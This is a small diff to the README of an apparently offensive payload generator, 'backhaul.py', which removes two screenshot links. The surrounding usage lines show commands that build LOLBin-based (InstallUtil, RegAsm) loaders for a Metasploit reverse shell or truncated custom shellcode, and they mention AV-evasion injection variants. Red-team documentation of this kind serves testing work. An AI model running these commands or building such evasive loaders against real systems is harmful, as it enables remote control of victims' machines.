@@ -47,8 +47,6 @@ Parameters like listener IP, listener port and MSF payload type are specified, b
 ```
 python backhaul.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
 ```
-![image](https://github.com/user-attachments/assets/047de769-d90f-4350-b7c9-96ce3382d891)
-
 
 - **Custom Shellcode Mode**
 
@@ -56,7 +54,6 @@ Custom shellcode created using 3rd party tools like micr0_shell (https://github.
 ```
 python backhaul.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
 ```
-![image](https://github.com/user-attachments/assets/c60a0235-f614-4823-9fc9-606c4f5e59be)
 
 - **AV-evasion injection variants**
 ```
